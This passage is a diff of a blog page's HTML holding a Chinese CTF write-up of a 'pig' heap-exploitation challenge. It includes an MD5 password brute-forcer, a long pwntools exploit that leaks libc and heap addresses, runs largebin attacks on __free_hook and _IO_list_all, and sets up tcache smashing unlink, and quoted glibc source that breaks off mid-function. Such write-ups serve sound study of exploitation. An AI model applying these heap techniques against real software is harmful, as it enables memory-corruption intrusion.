@@ -59,8 +59,6 @@
     <div class="date">2023 July 27th</div>
     <div class="tags">
       
-      <div class="tag-item">CTF</div>
-      
       <div class="tag-item">PWN</div>
       
       <div class="tag-item">wp</div>
@@ -80,18 +78,54 @@
 <p>5: 0x3807 change role</p>
 <h3 id="struct"><a href="#struct" class="headerlink" title="struct"></a>struct</h3><p>通过add函数，猜测出heap_list，heap_size的作用，结合free、edit函数找到两个标志位</p>
 <p>结合每个的大小与偏移，推测出数组的数量</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">house</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> *<span class="built_in">list</span>[<span class="number">0x18</span>];</span><br><span class="line">    <span class="type">int</span> size[<span class="number">0x18</span>];</span><br><span class="line">    <span class="type">char</span> flag1[<span class="number">0x18</span>];</span><br><span class="line">    <span class="type">char</span> flag2[<span class="number">0x18</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tmp_house</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">house</span> <span class="title">peppa_house</span>;</span></span><br><span class="line">  <span class="type">int</span> current_peppasize;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">house</span> <span class="title">mummy_house</span>;</span></span><br><span class="line">  <span class="type">int</span> current_mummysize;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">house</span> <span class="title">daddy_house</span>;</span></span><br><span class="line">  <span class="type">int</span> current_daddysize;</span><br><span class="line">  <span class="type">int</span> show_time;</span><br><span class="line">  <span class="type">int</span> edit_time;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
+<pre><code class="c">struct house
+&#123;
+    char *list[0x18];
+    int size[0x18];
+    char flag1[0x18];
+    char flag2[0x18];
+&#125;;
+</code></pre>
+<pre><code class="c">struct tmp_house
+&#123;
+  struct house peppa_house;
+  int current_peppasize;
+  struct house mummy_house;
+  int current_mummysize;
+  struct house daddy_house;
+  int current_daddysize;
+  int show_time;
+  int edit_time;
+&#125;;
+</code></pre>
 <h3 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h3><ol>
 <li>填充1个1和n个0,使信息长度为N*512+448(bit)</li>
 <li>用64bit存储填充前信息长度，加在后面，长度变为(N+1)*512</li>
 <li>装入标准的幻数: A&#x3D;0x67452301, B&#x3D;0xefcdab89, C&#x3D;0x98badcfe, D&#x3D;0x10325476</li>
 <li>四轮循环运算，循环次数为分组个数(N+1)</li>
 </ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    start = <span class="string">&quot;3c4400&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000000</span>):</span><br><span class="line">            s=<span class="string">&#x27;A&#x27;</span>+<span class="built_in">str</span>(i)</span><br><span class="line">            <span class="comment">#s=&#x27;B&#x27;+str(i)</span></span><br><span class="line">            <span class="comment">#s=&#x27;C&#x27;+str(i)</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Test %s &quot;</span> % s</span><br><span class="line">            <span class="keyword">if</span> hashlib.md5(s).hexdigest().startswith(start):</span><br><span class="line">                <span class="built_in">print</span>(s)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">A39275120</span></span><br><span class="line"><span class="string">B3332073</span></span><br><span class="line"><span class="string">C75929410</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
-
+<pre><code class="python">import hashlib
+ 
+def main():
+    start = &quot;3c4400&quot;
+    while True:
+        for i in range(100000000):
+            s=&#39;A&#39;+str(i)
+            #s=&#39;B&#39;+str(i)
+            #s=&#39;C&#39;+str(i)
+            print &quot;Test %s &quot; % s
+            if hashlib.md5(s).hexdigest().startswith(start):
+                print(s)
+                return
+ 
+if __name__ == &#39;__main__&#39;:
+    main()
+&#39;&#39;&#39;
+A39275120
+B3332073
+C75929410
+&#39;&#39;&#39;
+</code></pre>
 <h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><ul>
 <li>add大小0x90~0x430，同一角色size只能增加</li>
 <li>peppa 20次，mummy 10次，daddy 5次</li>
@@ -127,18 +161,285 @@
 <p>好在出题人给add3加了一个gift,可以申请一个0xe8的完整可写的堆块</p>
 <p>所以最后可以把largebin attack指向的largebin留着，完成add3的最后一步，使得daddy从这个largechunk中切一块，从而直接获得完整的修改权限</p>
 <p>下策是修改large chunk的chain指针，使其指向可写堆块</p>
-<h3 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">	cmd += <span class="string">&quot;&quot;</span></span><br><span class="line">	gdb.attach(p, cmd)</span><br><span class="line">	pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;&quot;</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line">p = process(<span class="string">&quot;./pig&quot;</span>)</span><br><span class="line"><span class="comment"># libc=ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#p = remote(host, port)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>): <span class="comment">#0xa0-0x430</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;size: &quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">	p.sendafter(<span class="string">&quot;message: &quot;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">	p.sendafter(<span class="string">&quot;message: &quot;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delet</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">role</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> role == <span class="number">1</span>:</span><br><span class="line">		p.sendlineafter(<span class="string">&quot;user:\n&quot;</span>, <span class="string">&quot;A39275120&quot;</span>)</span><br><span class="line">	<span class="keyword">elif</span> role == <span class="number">2</span>:</span><br><span class="line">		p.sendlineafter(<span class="string">&quot;user:\n&quot;</span>, <span class="string">&quot;B3332073&quot;</span>)</span><br><span class="line">	<span class="keyword">elif</span> role == <span class="number">3</span>:</span><br><span class="line">		p.sendlineafter(<span class="string">&quot;user:\n&quot;</span>, <span class="string">&quot;C75929410&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#tcache 0xa0</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))</span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))</span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))</span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))</span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))<span class="comment">#2-&gt;4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#unsortedbin-&gt;smallbin</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#tcache 0x160</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))<span class="comment">#1-&gt;6</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))<span class="comment">#1-&gt;7</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))<span class="comment">#protect 2-&gt;5</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))<span class="comment">#1-&gt;8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fill tcache 0x160</span></span><br><span class="line">delet(<span class="number">0</span>)</span><br><span class="line">delet(<span class="number">1</span>)</span><br><span class="line">delet(<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">3</span>)</span><br><span class="line">delet(<span class="number">4</span>)</span><br><span class="line">delet(<span class="number">5</span>)</span><br><span class="line">delet(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fill tcache 0xa0 to 5</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">0</span>)</span><br><span class="line">delet(<span class="number">1</span>)</span><br><span class="line">delet(<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">3</span>)</span><br><span class="line">delet(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#split into unsorted bin</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">delet(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">change(<span class="number">1</span>)<span class="comment">#to clear flag0</span></span><br><span class="line">view(<span class="number">7</span>)<span class="comment">#leak libc</span></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">0x219ce0</span></span><br><span class="line">free_hook = libc_base + <span class="number">0x2204a8</span></span><br><span class="line">iolistall = libc_base + <span class="number">0x21a680</span></span><br><span class="line">memset_got = libc_base + <span class="number">0x219188</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&quot;free_hook = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(free_hook)))</span><br><span class="line">log.success(<span class="string">&quot;iolistall = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(iolistall)))</span><br><span class="line">log.success(<span class="string">&quot;memset_got = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(memset_got)))</span><br><span class="line"></span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0xb0</span>, cyclic(<span class="number">0x30</span>))<span class="comment">#smallbin 0 = 1-&gt;7	</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))<span class="comment">#into smallbin 1-&gt;9</span></span><br><span class="line">delet(<span class="number">8</span>)</span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0xb0</span>, cyclic(<span class="number">0x30</span>))<span class="comment">#smallbin 1 = 1-&gt;8</span></span><br><span class="line"><span class="comment">#unsortedbin finished, 1-&gt;9(0x160);2-&gt;5(0xa0);3-&gt;1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak heap_base</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment">#1-&gt;10</span></span><br><span class="line">add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment">#1-&gt;11</span></span><br><span class="line">delet(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment">#1-&gt;12</span></span><br><span class="line">fixed_largebin_fd = libc_base + <span class="number">0x21a0d0</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x160</span>)</span><br><span class="line">edit(<span class="number">10</span>, payload)</span><br><span class="line">view(<span class="number">10</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;daaa&quot;</span>)</span><br><span class="line">heap_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x13120</span></span><br><span class="line">log.success(<span class="string">&quot;heap0_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"><span class="comment">#fix it</span></span><br><span class="line">payload = p64(fixed_largebin_fd)*<span class="number">2</span> + cyclic(<span class="number">0x150</span>)</span><br><span class="line">edit(<span class="number">10</span>, payload)</span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 2-&gt;6 largebin1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#largebin attack</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 2-&gt;7 largebin2</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 1-&gt;13 protect</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 2-&gt;8 </span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 1-&gt;14 protect</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x420</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 2-&gt;9 largebin3</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 1-&gt;15 protect</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">9</span>)</span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># trigger largebin3 1-&gt;16</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#largebin attack1</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">6</span>)</span><br><span class="line">payload = p64(heap_base+<span class="number">0x14e60</span>) + p64(free_hook + <span class="number">0x8</span>-<span class="number">0x20</span>)+cyclic(<span class="number">0x150</span>)</span><br><span class="line">edit(<span class="number">9</span>, payload)</span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># trigger largebin1 1-&gt;17</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># memsetgot-0x8 -&gt; 2-&gt;9   3-&gt;2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fix largebin&amp;attck2</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">7</span>)</span><br><span class="line">payload = p64(heap_base+<span class="number">0x14e60</span>) + p64(iolistall-<span class="number">0x20</span>)+cyclic(<span class="number">0x150</span>)</span><br><span class="line">edit(<span class="number">9</span>, payload)</span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># trigger largebin2 1-&gt;18 iolistall-&gt; 2-&gt;7</span></span><br><span class="line"><span class="comment">#fix largebin</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">payload = p64(heap_base+<span class="number">0x14e60</span>)*<span class="number">2</span>+cyclic(<span class="number">0x150</span>)</span><br><span class="line">edit(<span class="number">7</span>, payload)</span><br><span class="line">payload = p64(heap_base+<span class="number">0x13da0</span>)*<span class="number">2</span>+cyclic(<span class="number">0x150</span>)</span><br><span class="line">edit(<span class="number">9</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#tcache smashing unlink</span></span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x420</span>, cyclic(<span class="number">0x160</span>)) <span class="comment">#2-9 calloced</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x40</span>) + p64(heap_base+<span class="number">0x12ce0</span>) + p64(free_hook-<span class="number">0x10</span>)+cyclic(<span class="number">0x110</span>)</span><br><span class="line">edit(<span class="number">8</span>, payload)</span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))   <span class="comment">#3-&gt;4</span></span><br><span class="line"><span class="comment">#gift!</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;01dwang&#x27;s Gift:\n&quot;</span>)</span><br><span class="line"><span class="comment">#fake IOFILE</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h3><pre><code class="python">#!/usr/bin/env python2
+# -*- coding: utf-8 -*-
+from pwn import*
 
-<h2 id="伪造IOFILE"><a href="#伪造IOFILE" class="headerlink" title="伪造IOFILE"></a>伪造IOFILE</h2><h3 id="改-free-hook做法"><a href="#改-free-hook做法" class="headerlink" title="改__free_hook做法"></a>改__free_hook做法</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">char</span> *new_buf;</span><br><span class="line">          <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">          <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">          <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">          <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">            <span class="keyword">return</span> EOF;</span><br><span class="line">          new_buf = <span class="built_in">malloc</span> (new_size); <span class="comment">// 1</span></span><br><span class="line">          <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">              <span class="keyword">return</span> EOF;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">if</span> (old_buf)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen); <span class="comment">// 2</span></span><br><span class="line">              <span class="built_in">free</span> (old_buf); <span class="comment">// 3</span></span><br><span class="line">              <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">              fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen); <span class="comment">// 4</span></span><br><span class="line"> </span><br><span class="line">          _IO_setb (fp, new_buf, 